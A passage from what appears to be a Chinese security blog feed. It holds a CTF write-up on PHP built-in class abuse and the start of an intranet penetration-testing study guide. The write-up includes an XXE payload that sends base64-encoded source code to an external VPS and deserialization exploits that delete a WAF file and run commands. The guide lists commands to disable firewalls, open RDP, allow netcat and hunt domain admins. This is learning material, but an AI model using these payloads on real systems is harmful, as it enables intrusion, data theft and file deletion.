&quot;http://108.166.201.16:8000/evil.dtd&quot;&gt;%int;%all;%send;]&gt;</code></pre><p>evil.dtd</p><pre><code class="php">&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://108.166.201.16:5555/?%payl;&#39;&gt;&quot;&gt;</code></pre><p>在vps上放上这两个文件<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665934117600-563713ba-7b9f-40ba-9e24-4b49b463c64a.png" alt="img"><br>然后再使用vps监听5555端口<br>最终构造payload</p><pre><code class="php">http://16c35a6e-0285-4dc1-9c3d-2acf598489fc.node4.buuoj.cn:81/show.php?module=SimpleXMLElement&amp;args[]=http://108.166.201.16:8000/test.xml&amp;args[]=2&amp;args[]=true</code></pre><p>我们可以看到接受到了数据，base64解码即可<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665934164637-826456e2-a39d-499b-96c6-528cbaa8a0f9.png" alt="img"><br>同理可获得其他页面源码</p><h1 id="使用-ZipArchive-类来删除文件"><a href="#使用-ZipArchive-类来删除文件" class="headerlink" title="使用 ZipArchive 类来删除文件"></a>使用 ZipArchive 类来删除文件</h1><h2 id="ZipArchive-类"><a href="#ZipArchive-类" class="headerlink" title="ZipArchive 类"></a>ZipArchive 类</h2><p>PHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理。<br>下面列举几个常见的类方法：</p><ul><li><a href="https://www.php.net/manual/zh/ziparchive.addemptydir.php">ZipArchive::addEmptyDir</a>：添加一个新的文件目录</li><li><a href="https://www.php.net/manual/zh/ziparchive.addfile.php">ZipArchive::addFile</a>：将文件添加到指定zip压缩包中</li><li><a href="https://www.php.net/manual/zh/ziparchive.addfromstring.php">ZipArchive::addFromString</a>：添加新的文件同时将内容添加进去</li><li><a href="https://www.php.net/manual/zh/ziparchive.close.php">ZipArchive::close</a>：关闭ziparchive</li><li><a href="https://www.php.net/manual/zh/ziparchive.extractto.php">ZipArchive::extractTo</a>：将压缩包解压</li><li><a href="https://www.php.net/manual/zh/ziparchive.open.php">ZipArchive::open</a>：打开一个zip压缩包</li><li><a href="https://www.php.net/manual/zh/ziparchive.deleteindex.php">ZipArchive::deleteIndex</a>：删除压缩包中的某一个文件，如：deleteIndex(0)代表删除第一个文件</li><li><a href="https://www.php.net/manual/zh/ziparchive.deletename.php">ZipArchive::deleteName</a>：删除压缩包中的某一个文件名称，同时也将文件删除</li><li>……</li></ul><p>我们来重点看看 ZipArchive::open 方法：</p><pre><code class="php">ZipArchive::open(string $filename, int $flags=0)</code></pre><p>该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。</p><ul><li>filename：要打开的ZIP存档的文件名。</li><li>flags：用于打开档案的模式。有以下几种模式： <ul><li>ZipArchive::OVERWRITE：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。</li><li>ZipArchive::CREATE：如果不存在则创建一个zip压缩包。</li><li>ZipArchive::RDONLY：只读模式打开压缩包。</li><li>ZipArchive::EXCL：如果压缩包已经存在，则出错。</li><li>ZipArchive::CHECKCONS：对压缩包执行额外的一致性检查，如果失败则显示错误。</li></ul></li></ul><p>注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。<br>也就是说我们可以利用ZipArchive原生类调用open方法删除目标主机上的文件。下面我们来看一道CTF题目。</p><h2 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h2><p>源码下载:<a href="https://raw.githubusercontent.com/fghcvjk/NepCTF-2021/master/%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD.zip">https://raw.githubusercontent.com/fghcvjk/NepCTF-2021/master/%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD.zip</a></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&#39;shell.php&#39;);class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;        public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;class login&#123;    public $file;    public $filename;    public $content;    public function __construct($file,$filename,$content)    &#123;        $this-&gt;file=$file;        $this-&gt;filename=$filename;        $this-&gt;content=$content;    &#125;    public function checking($username,$password)    &#123;        if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;)&#123;            $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content);            die(&#39;login success you can to open shell file!&#39;);        &#125;    &#125;&#125;class register&#123;    public function checking($username,$password)    &#123;        if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;)&#123;            die(&#39;success register admin&#39;);        &#125;else&#123;            die(&#39;please register admin &#39;);        &#125;    &#125;&#125;class Open&#123;    function open($filename, $content)&#123;        if(!file_get_contents(&#39;waf.txt&#39;))&#123;            shell($content);        &#125;else&#123;            echo file_get_contents($filename.&quot;.php&quot;);        &#125;    &#125;&#125;if($_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) &amp;&amp; (sha1($_GET[&#39;a&#39;])=== sha1($_GET[&#39;b&#39;])))&#123;    @unserialize(base64_decode($_POST[&#39;unser&#39;]));&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666010658741-eba5b190-5be1-4994-982d-2c2109ed09eb.png" alt="img"><br>这里反序列化前有个校验，直接使用数组绕过</p><pre><code class="php">http://127.0.0.1/test/?a[]=1&amp;b[]=2</code></pre><p>读取下shell.php的内容<br>构造payload:</p><pre><code class="php">&lt;?phpclass Open&#123;&#125;class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;    public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;$a = new Game();$a-&gt;username = &#39;admin&#39;;$a-&gt;password = &#39;admin&#39;;$a-&gt;register = &#39;admin&#39;;$a-&gt;file=&#39;123&#39;;$a-&gt;content = &#39;whoami&#39;;$a-&gt;filename = &#39;php://filter/read=convert.base64-encode/resource=shell&#39;;$a-&gt;file = new Open();echo base64_encode(serialize($a));</code></pre><p>解码得到shell.php的源码:</p><pre><code class="php">&lt;?phpfunction shell($cmd)&#123;    if(strlen($cmd)&lt;10)&#123;        if(preg_match(&#39;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#39;,$cmd))&#123;            die(&quot;NO&quot;);        &#125;else&#123;            return system($cmd);        &#125;    &#125;else&#123;        die(&#39;so long!&#39;);     &#125;&#125;</code></pre><p>shell.php可以执行系统命令<br>但是如果要执行shell.php<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666010871391-7c2b5910-4f40-4616-8ff1-6e6309df9a70.png" alt="img"><br>必须不存在这个文件，那么我们就要想办法把它删除<br>我们必须要使用原生类，这个原生类还必须是open方法可以删除文件<br>遍历一下:</p><pre><code class="php">&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;    $methods = get_class_methods($class);    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#39;open&#39;        ))) &#123;            print $class . &#39;::&#39; . $method . &quot;\n&quot;;        &#125;    &#125;&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666011335328-c952daa5-ae18-4e62-9460-028443cb42c0.png" alt="img"><br>ZipArchive刚好有个open方法可以满足,上文已经介绍过了<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666011423047-bc1ad514-77ec-4e4b-b46b-633575e9e46f.png" alt="img"><br>传入8相当于重写文件<br>最终构造poc:</p><pre><code class="php">&lt;?phpclass Open&#123;&#125;class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;    public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;$a = new Game();$a-&gt;username = &#39;admin&#39;;$a-&gt;password = &#39;admin&#39;;$a-&gt;register = &#39;admin&#39;;$a-&gt;file=&#39;123&#39;;$a-&gt;content = 8;$a-&gt;filename = &#39;waf.txt&#39;;$a-&gt;file = new ZipArchive();echo base64_encode(serialize($a));</code></pre><pre><code class="php">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo4O30=</code></pre><p>传入后waf.txt就被删除，我这里是本地搭建的环境所以直接可以看到<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666012203141-9ea79c5d-767c-451e-8f16-60826fb1108f.png" alt="img"><br>接下来构造poc执行命令即可:</p><pre><code class="php">&lt;?phpclass Open&#123;&#125;class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;    public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;$a = new Game();$a-&gt;username = &#39;admin&#39;;$a-&gt;password = &#39;admin&#39;;$a-&gt;register = &#39;admin&#39;;$a-&gt;file=&#39;123&#39;;$a-&gt;content = &#39;type flag&#39;;$a-&gt;filename = &#39;111&#39;;$a-&gt;file = new Open();echo base64_encode(serialize($a));</code></pre><p>我这里是用windows系统复现的，所以使用命令不同，思路都一样<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666012717080-da919474-bae9-47a8-978b-cd5b2e4b94a1.png" alt="img"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/rawrecruit/article/details/123968687">https://blog.csdn.net/rawrecruit/article/details/123968687</a><br><a href="https://www.freebuf.com/articles/network/331981.html">https://www.freebuf.com/articles/network/331981.html</a><br><a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网学习篇</title>
      <link href="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/"/>
      <url>/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="内网安全第一章"><a href="#内网安全第一章" class="headerlink" title="内网安全第一章"></a>内网安全第一章</h1><h2 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h2><p><strong>工作组</strong>:工作组（ Work Group)，在一个大的单位内，可能有成百上千台电脑互相连接组成局域网，它们都会列在“网络（网上邻居)”内，如果这些电脑不分组，可想而知有多么混乱，要找一台电脑很困难。为了解决这一问题，就有了“工作组”这个概念，将不同的电脑一般按功能(或部门）分别列入不同的工作组中，如技术部的电脑都列入“技术部”工作组中，行政部的电脑都列入“行政部”工作组中。你要访问某个部门的资源，就在“网络”里找到那个部门的工作组名，双击就可以看到那个部门的所有电脑了。相比不分组的情况就有序的多了，尤其是对于大型局域网络来说。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628095849118.png" alt="image-20220628095849118"></p><p><strong>域</strong>(Domain)是一个有安全边界的计算机集合（安全边界意思是在两个域中，一个域中的用户无法访问另一个域中的资源），可以简单的把域理解成升级版的“工作组”，相比工作组而言,它有一个更加严格的安全管理控制机制,如果你想访问域内的资源,必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限,还需要取决于你在该域中的用户身份。<br><strong>域控制器</strong>（Domain Controller，简写为Dc）是一个域中的一台类似管理服务器的计算机，相当于一个单位的门卫一样，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都是经过它的审核。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628100052625.png" alt="image-20220628100052625"></p><p><strong>域的分类:</strong></p><p><strong>单域</strong><br>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。·一般在一个域内要建立至少两个域服务器，一个作为Dc，一个是备份DC。如果没有第二个备份Dc，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息)是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的Dc恢复了就行了。</p><p><strong>父域</strong></p><p>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。<br>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。<br>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。(因为在同一个域内，信息交互的条目是很多的，而且不压缩;而在域和域之间，信息交互的条目相对较少，而且压缩。）<br>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略(包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</p><p><strong>域树</strong></p><p>域树指若干个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则需要建立信任关系(Trust Relation)。<br>信任关系是连接在域与域之间的桥梁。域树内的父域与子域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628100413944.png" alt="image-20220628100413944"></p><p><strong>域森林</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628100503104.png" alt="image-20220628100503104"></p><p><strong>DNS域名服务器</strong>是进行域名(domain name)和与之相对应的IP地址(IPaddress)转换的服务器。<br>在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等。<br>一般情况下,我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为通常DNS服务器和域控制器会处在同一台机器上。</p><p><strong>活动目录</strong>（Active Directory）是域环境中提供目录服务的组件。目录是什么?目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。<br>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</p><p><strong>逻辑结构</strong></p><p>在活动目录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为“逻辑结构”。<br>活动目录的逻辑结构就包括上面讲到的组织单元（ou)、域(domain)、域树( tree)、域森林（forest）。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628102316204.png" alt="image-20220628102316204"></p><p><strong>活动目录主要功能</strong></p><p>帐号集中管理，所有帐号均存在服务器上,方便对帐号的重命令/重置密码。<br>软件集中管理，统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件,可以让用户自由选择安装软件。<br>环境集中管理，利用AD可以统一客户端桌面,IE,TCP/IP等设置。<br>增强安全性，统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。更可靠，更少的宕机时间。如:利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，宕机时间 少。活动目录为Microsoft统一管理的基础平台，其它isa,exchange,sms等服务都依赖于这个基础平台。</p><p><strong>AD和DC区别</strong></p><p>如果网络规模较大，我们就会考虑把网络中的众多对象:计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。那么我们应该把这个数据库放在哪台计算机上呢?规定是这样的，我们把存放有活动目录数据库的计算机就称为Dc。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</p><p><strong>安全域的划分</strong></p><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL(网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域;允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p><p><strong>DMZ</strong></p><p>DMZ称为“隔离区”，也称“非军事化区”。是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。<br>这个缓冲区位于企业内部网络和外部网络之间的小网络区域内，在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。<br>另一方面，通过这样一个DMz区域，更加有效地保护了内部网络，因为这种网络部署，比起一般的防火墙方案，对攻击者来说又多了一道关卡。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628103312842.png" alt="image-20220628103312842"></p><p><strong>DMZ屏障功能</strong></p><p>(1) 内网可以访问外网<br>内网的角户需要自由地访问外网。在这一策略中，防火墙需要执行NAT。</p><p>(2) 内网可以访问DMZ<br>此策略使内网用户可以使用或者管理DMZ中的服务器。</p><p>(3) 外网不能访问内网<br>这是防火墙的基本策略了，内网中存放的是公司内部数据，显然这些数据是不允许外网的用户进行访问的。如果耍访问，就要通过VPN方式来进行。</p><p>(4) 外网可以访问DMZ<br>DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由防火墙完成对外地址到服务器实际地址的转换。</p><p>(5) DMZ不能访问内网<br>如不执行此策略，则当入侵者攻陷DMZ时，内部网络将不会受保护。</p><p>(6）DMZ不能访问外网<br>此条策略也有例外，比如我们的例子中，在DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作。</p><p><strong>域中计算机分类</strong></p><p>域控制器-成员服务器-客户机-独立服务器</p><p>域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。<br>域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。同时独立服务器既可以转换为域控制器，也可以加入到某个域成为成员服务器。</p><p><strong>内权限解读:</strong></p><p><strong>域本地组</strong>，多域用户访问单域资源（访问同一个域)。可以从任何域添加用户账户、通用组和全局组，只能在其所在域内指派权限。域本地组不能嵌套于其他组中。它主要是用于授予位于本域资源的访问权限</p><p><strong>全局组</strong>，单域用户访问多域资源（必须是同一个域里面的用户）。只能在创建该全局组的域上进行添加用户和全局组，可以在域林中的任何域中指派权限，全局组可以嵌套在其他组中。</p><p><strong>通用组</strong>，通用组成员来自域林中任何域中的用户账户、全局组和其他的通用组，可以在该域林中的任何域中指派权限，可以嵌套于其他域组中。非常适于域林中的跨域访问。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628104718578.png" alt="image-20220628104718578"></p><p><strong>A-G-DL-P策略</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628154433781.png" alt="image-20220628154433781"></p><p><strong>本地域组的权限</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628155157050.png" alt="image-20220628155157050"></p><p><strong>全局组、通用组的权限</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628155303297.png" alt="image-20220628155303297"></p><h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><p><strong>工作组信息搜集</strong></p><p><strong>本机信息收集</strong></p><p>查询网络配置</p><pre><code>ipconfig /all</code></pre><p>查询用户列表</p><pre><code>net usernet localgroup administratorsquery user ||qwinsta 查看当前在线用户</code></pre><p>查询进程列表</p><pre><code>tasklist /vwmic process list brief</code></pre><p>查询操作系统及安装软件版本信息</p><pre><code>获取操作系统和版本信息systeminfo查看安装软件以及版本路径wmic product name,versionpowershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</code></pre><p>查询端口列表</p><pre><code>netstat -ano</code></pre><p>查询补丁列表</p><pre><code>systeminfoWmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre><p>查询本机共享</p><pre><code>net sharewmic share get name,path,status</code></pre><p>查询防火墙配置</p><pre><code>查看防火墙配置:netsh firewall show config关闭防火墙:Windows server 2003系统及其以前：netsh firewall set opmode disableWindows server 2003以后系统版本：netsh advfirewall set allprofiles state off修改防火墙配置windows server 2003系统及之前版本，允许指定程序全部连接:netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enablewindows server 2003之后系统版本:允许指定程序接入netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \nc.exe&quot;允许指定程序连出netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot;允许3389端口放行netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow </code></pre><p>查询并开启远程连接服务</p><pre><code>查询远程连接端口Reg query &quot;hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp&quot; /v portnumberwindows server 2008和windows server 2012开启3389方法(win7只可以用前两条):wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1  wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1 reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /fwindows server 2003和windows xp:wmic path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1以上前提条件是确保Windows Management Instrumentation（Winmgmt）服务已正常启动，权限的话需要administrator及以上</code></pre><p>查询当前权限</p><pre><code>whoami whoami /all #获取域SIDnet user XXX /domain 获取指定账户的详细信息</code></pre><p>判断是否有域</p><pre><code>ipconfig /allsysteminfonet config workstationnet time /domain1.存在域，当前不是域用户2.存在域，当前是域用户3.不存在域</code></pre><p><strong>域内存活主机探测</strong></p><p><strong>1.利用NetBIOS快速探测内网</strong></p><p>工具:Nbtscan</p><p>使用方法:nbtscan.exe IP</p><p><strong>2.利用icmp探测内网</strong></p><pre><code>for /L %l in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%l | findstr &quot;TTL=&quot;</code></pre><p><strong>3.利用arp扫描完整探测内网</strong></p><p>1.arp-scan</p><p>2.Invoke-ARPScan.ps1</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220630100231019.png" alt="image-20220630100231019"></p><p><strong>4.利用常规tcp/udp端口扫描探测内网</strong></p><p>工具:scanline</p><pre><code>scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\windows\temp\sl_res.txt  -p 192.168.4.1-254 /b</code></pre><p><strong>域内端口扫描</strong></p><p><strong>1.telnet探测</strong></p><pre><code>telnet ip 端口</code></pre><p><strong>2.S扫描器</strong></p><pre><code>S.exe TCP 192.168.1.1192.168.1.254 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111256 /Banner /save</code></pre><p><strong>域内基础信息收集</strong></p><pre><code>net view /domainnet view /domain:XXXnet group /domainnet group &quot;domain computers&quot; /domainnet accounts /domainnltest /domain_trusts</code></pre><p><strong>域内控制器的查找</strong></p><pre><code>nltest /DCLIST:XXXNslookup -type=SRV _ldap._tcpnet time /domainnet group &quot;Domain Controllers&quot; /domainnetdom query pdc</code></pre><p><strong>域内用户和管理员</strong></p><pre><code>查询所有域用户列表net user /domainwmic useraccount get /alldsquery usernet localgroup administrators /domain查询域管理员用户组net group &quot;domain admins&quot; /domainnet group &quot;Enterprise Admins&quot; /domain</code></pre><p><strong>查找域管理进程</strong></p><p><strong>1.本机检查</strong></p><ul><li>获取域管理员列表 A,B,C</li><li>查看本机所有进程</li><li>交叉</li></ul><pre><code>1.获取域管理员列表net group &quot;Domain Admins&quot; /domain2.列出本机所有进程及进程用户tasklist /v3.寻找是否有进程所有者位域管理员的进程</code></pre><p><strong>2.查询域控制器的域用户会话</strong></p><pre><code>1.收集域控制器的列表net group &quot;Domain Controllers&quot; /domain2.收集域管理员的列表net group &quot;Domain Admins&quot; /domain3.使用Netsess.exe查询每个域控制器收集所有活动域会话的列表Netsess.exe -h4.将域管理员列表与活动会话列表交叉引用，以确定哪些IP地址具有活动域令牌。</code></pre><p><strong>3.扫描远程系统上运行的任务</strong></p><pre><code>1.收集域管理员的列表net group &quot;Domain Admins&quot; /domain3.运行脚本FOR /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause</code></pre><p><strong>4.扫描远程系统上的NetBIOS信息</strong></p><pre><code>for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</code></pre><p><strong>PowerShell收集域信息</strong></p><p>PowerShell版本</p><ul><li>2.0 win2008,win7</li><li>3.0 win2012,win8</li><li>4.0 win2012R2,win8.1</li><li>5.0 win2016,win10</li></ul><p>PowerShell策略</p><pre><code>Restricted #不能执行任何脚本Allsigned #只允许执行正规签名的脚本Unrestricted #执行任意脚本RemoteSigned 